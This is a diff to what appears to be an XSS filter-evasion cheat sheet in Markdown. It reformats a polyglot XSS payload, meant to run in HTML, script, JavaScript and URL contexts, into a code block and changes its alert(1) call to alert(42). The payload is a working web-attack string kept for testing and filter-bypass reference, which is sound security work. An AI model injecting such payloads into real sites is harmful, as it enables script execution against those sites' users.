@@ -18,7 +18,10 @@ This is a normal XSS JavaScript injection, and most likely to get caught but I s
 
 The following is a "polygot test XSS payload." This test will execute in multiple contexts including html, script string, js and URL. Thank you to [Gareth Heyes](https://twitter.com/garethheyes) for this [contribution](https://twitter.com/garethheyes/status/997466212190781445).
 
-`javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
+```
+javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+```
 
 ### Malformed A Tags
 
